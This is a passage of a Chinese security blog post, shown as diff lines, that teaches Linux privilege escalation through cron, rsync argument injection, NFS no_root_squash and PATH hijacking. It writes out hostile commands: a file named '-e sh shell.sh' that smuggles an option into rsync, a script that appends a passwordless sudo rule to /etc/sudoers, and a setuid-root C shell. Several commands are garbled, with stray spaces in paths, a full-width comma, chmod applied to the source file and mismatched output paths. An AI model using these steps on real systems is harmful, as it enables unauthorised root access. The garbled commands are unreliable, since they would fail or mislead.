+<p>等待，直到cron执行了脚本并通过键入以下内容获得root权限。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo su<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="rsync"><a href="#rsync" class="headerlink" title="rsync"></a>rsync</h3><p>Rsync是“快速，通用，远程（和本地）文件复制工具”，在linux系统上非常常见。</p>
+<p>与rsync一起使用的一些有趣的标志是:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-e, --rsh=COMMAND      specify the remote shell to use   --rsync-path=PROGRAM  specify the rsync to run on remote machine<br></code></pre></td></tr></table></figure>
+
+<p>我们可以使用该-e标志来运行所需的任何Shell脚本。让我们创建一个shell脚本，它将我们添加到sudoers文件中:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;echo &quot;my-user ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; shell.sh<br></code></pre></td></tr></table></figure>
+
+<p>现在让我们注入将运行我们的shell脚本的标志:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> -- <span class="hljs-string">&quot;-e sh shell.sh&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+<h2 id="0x09-Linux提权-NFS利用"><a href="#0x09-Linux提权-NFS利用" class="headerlink" title="0x09 Linux提权-NFS利用"></a>0x09 Linux提权-NFS利用</h2><p>如果您在linu服务器上具有低特权shell，并且发现服务器中具有NFS共享，则可以使用它来升级特权。但是成功取决于它的配置方式。</p>
+<h3 id="NFS介绍"><a href="#NFS介绍" class="headerlink" title="NFS介绍"></a>NFS介绍</h3><p>网络文件系统（<strong>NFS</strong>）是一个客户端&#x2F;服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在<strong>NFS</strong>协议是几个分布式文件系统标准，网络附加存储（NAS）之一。</p>
+<p>NFS是基于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/UDP/571511">UDP</a>&#x2F;IP协议的应用，其实现主要是采用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8">远程过程调用</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/RPC/609861">RPC</a>机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/RPC">RPC</a>采用了<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/XDR">XDR</a>的支持。<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/XDR/8796904">XDR</a>是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。</p>
+<h3 id="root-sqaush和no-root-sqaush"><a href="#root-sqaush和no-root-sqaush" class="headerlink" title="root_sqaush和no_root_sqaush"></a>root_sqaush和no_root_sqaush</h3><p>Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程根用户在连接时会分配一个用户“ <strong>nfsnobody</strong>”，它具有最少的本地特权。如果no_root_squash选项开启的话”，并为远程用户授予root用户对所连接系统的访问权限。在配置NFS驱动器时，系统管理员应始终使用“ root_squash”参数。</p>
+<p>&#x3D;&#x3D;对NFS的利用要求squash选项得开启&#x3D;&#x3D;</p>
+<h3 id="利用NFS并获取Root-Shell"><a href="#利用NFS并获取Root-Shell" class="headerlink" title="利用NFS并获取Root Shell"></a>利用NFS并获取Root Shell</h3><p>现在，我们拿到了一个低权限的shell，我们查看“ &#x2F;etc&#x2F;exports ”文件。</p>
+<p><strong>&#x2F;etc&#x2F;exports</strong>文件包含将哪些文件夹&#x2F;文件系统导出到远程用户的配置和权限。</p>
+<p>这个文件的内容非常简单，每一行由抛出路径，客户名列表以及每个客户名后紧跟的访问选项构成:[共享的目录] [主机名或IP(参数,参数)]其中参数是可选的，当不指定参数时，nfs将使用默认选项。默认的共享选项是 sync,ro,root_squash,no_delay。当主机名或IP地址为空时，则代表共享给任意客户机提供服务。当将同一目录共享给多个客户机，但对每个客户机提供的权限不同时，可以这样:[共享的目录] [主机名1或IP1(参数1,参数2)] [主机名2或IP2(参数3,参数4)]</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/0e6554640dbb494ba4b2faa28d53621d.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>我们可以看到**&#x2F;tmp** 文件夹是可共享的，远程用户可以挂载它。还有不安全的参数“ rw ”（读，写），“ sync ”和“ <strong>no_root_squash</strong>”</p>
+<p>同样我们也可以使用 showmount命令来查看。</p>
+<p>showmount命令用于查询NFS服务器的相关信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># showmount --help</span><br>Usage: showmount [-adehv]<br>[--all] [--directories] [--exports]<br>[--no-headers] [--<span class="hljs-built_in">help</span>] [--version] [host] -a或--all<br></code></pre></td></tr></table></figure>
+
+
+
+<p>以 host:dir 这样的格式来显示客户主机名和挂载点目录。</p>
+<blockquote>
+<p>-d或–directories  仅显示被客户挂载的目录名。</p>
+<p>-e或–exports  显示NFS服务器的输出清单。</p>
+<p>-h或–help  显示帮助信息。</p>
+<p>-v或–version  显示版本信。</p>
+<p>–no-headers  禁止输出描述头部信息。 显示NFS客户端信息 #</p>
+</blockquote>
+<p>showmount 显示指定NFS服务器连接NFS客户端的信息</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"># showmount <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>  #此ip为nfs服务器的 显示输出目录列表<br><br># showmount -e 显示指定NFS服务器输出目录列表（也称为共享目录列表）<br><br># showmount -e <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> 显示被挂载的共享目录<br><br># showmount -d   显示客户端信息和共享目录<br><br># showmount -a 显示指定NFS服务器的客户端信息和共享目录<br><br># showmount -a <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>这里不多说了</p>
+<p>我们接下来在我们的攻击机上安装客户端工具</p>
+<p>需要执行以下命令，安装nfs-common软件包。apt会自动安装nfs-common、rpcbind等12个软件包</p>
+<p>sudo apt install nfs-commonapt-get install cifs-utils</p>
+<p><strong>然后输入命令</strong></p>
+<p>showmount -e [IP地址]</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/94b22fbd44e94607bfa97fc12bb5fb5a-164658049401522.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><strong>创建目录以挂载远程系统。</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> / tmp / <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>在&#x2F;tmp&#x2F;test上装载Remote&#x2F;tmp文件夹:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -o rw，vers = 2 [IP地址]:/ tmp / tmp / <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/3990e063432643aea3ba76bbfc510f8d-164658049401524.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><strong>然后在&#x2F;tmp&#x2F;test&#x2F;中。新建一个c文件。</strong></p>
+<figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stan"><span class="hljs-meta">#include &lt;<span class="hljs-string">stdio.h</span>&gt;</span><br><span class="hljs-meta">#include &lt;<span class="hljs-string">stdlib.h</span>&gt;</span><br><span class="hljs-meta">#include &lt;<span class="hljs-string">sys</span>/<span class="hljs-string">types.h</span>&gt;</span><br><span class="hljs-meta">#include &lt;<span class="hljs-string">unistd.h</span>&gt; <span class="hljs-string">int</span> <span class="hljs-string">main</span>() &#123; <span class="hljs-string">setuid</span>(0); <span class="hljs-string">system</span>(&quot;/<span class="hljs-string">bin</span>/<span class="hljs-string">bash</span>&quot;); <span class="hljs-string">return</span> 0; &#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>也可以</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27;</span> &gt; /tmp/test/suid-shell.c<br></code></pre></td></tr></table></figure>
+
+<p><strong>编译:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc /tmp/test/suid-shell.c -o / tmp / 1 / suid-shel<br></code></pre></td></tr></table></figure>
+
+<p><strong>赋权:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +s /tmp/test/suid-shell.c<br></code></pre></td></tr></table></figure>
+
+<p><strong>回到要提权的服务器上</strong></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/6e956b067db24194b6dad1137446a812.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> / tmp./suid-shell<br></code></pre></td></tr></table></figure>
+
+<p><strong>可以看到是ROOT权限了</strong></p>
+<h2 id="0x0A-Linux提权-利用“-”路径配置错误"><a href="#0x0A-Linux提权-利用“-”路径配置错误" class="headerlink" title="0x0A Linux提权-利用“.”路径配置错误"></a>0x0A Linux提权-利用“.”路径配置错误</h2><p>如果在PATH有<code>.</code>的存在，则无需使用<code>./binary</code>即可执行它（使用<code>binary</code>即可）。那么我们将能够执行当前目录中的任何脚本或二进制文件。</p>
+<p>发生这种情况是因为Linux首先在“.”位置搜索程序。再在其他地方搜索。</p>
+<p>在叫<code>ls</code>的文件中，添加了一个代码，该代码将打印“ Hello world”</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/e772954b9ced4eef9106844ad192a0bd-164658049401527.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>在PATH变量的最前面添加<code>.</code></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/0e25ae391baa40d0ab794baf043e8215.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/7df1491fd39c4d43adc0680b5de6a72a.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>此时，执行命令<code>ls</code>，这将运行目录下的<code>ls</code>即<code>./ls</code>而不是我们所熟知的<code>ls</code></p>
+<p>现在，如果root用户以root特权执行代码，我们可以使用root特权实现任意代码执行。</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/3f5307fef3ad4bf98c64423710b1029c-164658049401531.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/251884.html">https://www.freebuf.com/articles/251884.html</a></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/" class="category-chain-item">实战总结</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83/">#提权</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Linux提权一文通</div>
+      <div>https://m0ck1ng-b1rd.github.io/2022/02/01/内网提权-Linux/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何语灵</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年2月1日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/02/20/%E4%BA%8C%E8%BF%9B%E5%88%B6/Win32/" title="滴水初级-Win32笔记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">滴水初级-Win32笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/13/HTB/Seal/" title="HackTheBox - Seal">
+                        <span class="hidden-mobile">HackTheBox - Seal</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
